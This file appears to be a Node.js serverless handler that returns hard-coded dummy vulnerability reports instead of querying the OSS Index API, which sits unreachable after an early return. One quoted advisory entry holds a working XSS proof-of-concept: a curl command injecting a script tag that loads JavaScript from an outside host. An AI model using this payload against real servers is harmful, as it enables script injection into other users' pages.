const axios = require("axios");

const {API, username} = process.env;

const DUMMY_VULNS = [{"pkg":"babel-runtime","pkgDescription":"babel selfContained runtime","vulns":[{"id":"6688ad9f-7b71-4e9d-8183-38637fbe821c","title":"CWE-377: Insecure Temporary File","description":"Creating and using insecure temporary files can leave application and system data vulnerable to attack.","cvssScore":0,"cwe":"CWE-377","reference":"https://ossindex.sonatype.org/vuln/6688ad9f-7b71-4e9d-8183-38637fbe821c"}]},{"pkg":"superagent","pkgDescription":"elegant & feature rich browser / node HTTP with a fluent API","vulns":[{"id":"6b42d0b8-d68c-4f60-8815-a51f4a3efa29","title":"CWE-409: Improper Handling of Highly Compressed Data (Data Amplification)","description":"The software does not handle or incorrectly handles a compressed input with a very high compression ratio that produces a large output.","cvssScore":4.1,"cvssVector":"CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:N/A:L","cwe":"CWE-409","reference":"https://ossindex.sonatype.org/vuln/6b42d0b8-d68c-4f60-8815-a51f4a3efa29"}]},{"pkg":"babel-core","pkgDescription":"A compiler for writing next generation JavaScript","vulns":[{"id":"6688ad9f-7b71-4e9d-8183-38637fbe821c","title":"CWE-377: Insecure Temporary File","description":"Creating and using insecure temporary files can leave application and system data vulnerable to attack.","cvssScore":0,"cwe":"CWE-377","reference":"https://ossindex.sonatype.org/vuln/6688ad9f-7b71-4e9d-8183-38637fbe821c"}]},{"pkg":"connect","pkgDescription":"High performance middleware framework","vulns":[{"id":"ae03ffc0-9529-4773-95e7-e5b6634ee1b1","title":"Denial of Service (DoS)","description":"> When using the static middleware, if the URL contains a valid file name and a trailing backslash the node server will crash with `Error: ENOENT, no such file or directory`.\n> \n> -- [github.com](https://github.com/senchalabs/connect/issues/452)","cvssScore":0,"reference":"https://ossindex.sonatype.org/vuln/ae03ffc0-9529-4773-95e7-e5b6634ee1b1"},{"id":"1484f842-79ac-424a-abc4-03d7b3d17ec9","title":"CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')","description":"The software uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the software does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.","cvssScore":5.8,"cvssVector":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N","cwe":"CWE-22","reference":"https://ossindex.sonatype.org/vuln/1484f842-79ac-424a-abc4-03d7b3d17ec9"},{"id":"07257200-4d10-45ca-a46a-14b3aa9b2673","title":"CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')","description":"The software uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the software does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.","cvssScore":5.8,"cvssVector":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N","cwe":"CWE-22","reference":"https://ossindex.sonatype.org/vuln/07257200-4d10-45ca-a46a-14b3aa9b2673"},{"id":"e1a46d3c-aa71-4850-8273-f5adf855286d","title":"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","description":"The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.","cvssScore":6.1,"cvssVector":"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","cwe":"CWE-79","reference":"https://ossindex.sonatype.org/vuln/e1a46d3c-aa71-4850-8273-f5adf855286d"},{"id":"843bf109-df0b-4ef2-8a9d-f2fa2f5ece19","title":"Cross-Site Scripting with connect.methodOverride()","description":"This middleware overwrite req.method with the req.body['_method'] value. When you don't catch the error it responds with a default error msg: \"Cannot [METHOD] [URL]\" (https://github.com/senchalabs/connect/blob/6db901f967036ccc3c892b4bcb5bcb59e0b0dca9/lib/proto.js#L155). Because this is not enough sanitized, you can force a Cross-Site Scripting in the response:\n\n~ curl \"localhost:3000\" -d \"_method=<script src=http://martes13.net/a.js></script>\"\nCannot <SCRIPT SRC=HTTP://MARTES13.NET/A.JS></SCRIPT> /\nThis is very dangerous because in a server like ExpressJS it won't be handled with a app.all('/*', ...), so all servers using this middleware are vulnerable.","cvssScore":6.5,"cvssVector":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N","reference":"https://ossindex.sonatype.org/vuln/843bf109-df0b-4ef2-8a9d-f2fa2f5ece19"},{"id":"7df31426-09a2-4b5f-a0ab-acc699023c57","title":"[CVE-2018-3717] connect node module before 2.14.0 suffers from a Cross-Site Scripting (XSS) vuln...","description":"connect node module before 2.14.0 suffers from a Cross-Site Scripting (XSS) vulnerability due to a lack of validation of file in directory.js middleware.","cvssScore":5.4,"cvssVector":"CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N","cve":"CVE-2018-3717","reference":"https://ossindex.sonatype.org/vuln/7df31426-09a2-4b5f-a0ab-acc699023c57"}]},{"pkg":"webpack-dev-server","pkgDescription":"Serves a webpack app. Updates the browser on changes.","vulns":[{"id":"555258ee-4500-4f29-99d6-c2e693cdeeea","title":"DNS rebinding vulnerability","description":"A lack of verification of the `host` header results in a DNS rebinding vulnerability which can lead to information disclosure as well as possible remote code execution.","cvssScore":0,"reference":"https://ossindex.sonatype.org/vuln/555258ee-4500-4f29-99d6-c2e693cdeeea"},{"id":"74f03a6d-3115-4959-bbd3-252e6e3c17de","title":"[CVE-2018-14732]  Improper Input Validation","description":"An issue was discovered in lib/Server.js in webpack-dev-server before 3.1.6. Attackers are able to steal developer's code because the origin of requests is not checked by the WebSocket server, which is used for HMR (Hot Module Replacement). Anyone can receive the HMR message sent by the WebSocket server via a ws://127.0.0.1:8080/ connection from any origin.","cvssScore":7.5,"cvssVector":"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N","cve":"CVE-2018-14732","reference":"https://ossindex.sonatype.org/vuln/74f03a6d-3115-4959-bbd3-252e6e3c17de"}]}];

const handler = async event => {

    return {
        statusCode: 200,
        body: JSON.stringify(DUMMY_VULNS)
    };

    try {
        const {data: report} = await axios(
            {
                url: 'https://ossindex.sonatype.org/api/v3/component-report',
                method: 'POST',
                auth: {
                    username: username,
                    password: API
                },
                data: {
                    "coordinates": JSON.parse(event.body).packageNames.map(pkg => {
                        return `pkg:npm/${pkg}@latest`
                    })
                }
            }
        );

        const vulns = report.reduce((prev, curr) => {
            if (curr.vulnerabilities.length === 0) {
                return prev;
            }

            return [
                ...prev,
                {
                    pkg: curr.coordinates.replace('pkg:npm/', '').replace('@latest', ''),
                    pkgDescription: curr.description,
                    vulns: curr.vulnerabilities
                }
            ]
        }, [])

        return {
            statusCode: 200,
            body: JSON.stringify(vulns)
        };
    } catch (e) {
        console.log(e);
        return {
            statusCode: 500
        };
    }

};

module.exports = {handler}
